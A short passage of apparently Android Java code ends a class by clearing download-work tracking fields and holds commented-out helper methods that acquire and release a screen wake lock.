            pCurrentWorkInfo = null;
            mTotalMap = null;
            mWaitingList = null;
        }
    }

//
//    private PowerManager.WakeLock mWakeLock;
//
//    public void screenWakeup() {
//        if (mWakeLock == null) {
//            PowerManager pm = (PowerManager) StaticConst.sContext.getSystemService(Context.POWER_SERVICE);
//            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "testAddApkDownloadInfo");
//            mWakeLock.acquire();
//        }
//    }
//
//    public void screenLock() {
//        if (mWakeLock != null) {
//            mWakeLock.release();
//            mWakeLock = null;
//        }
//    }

}
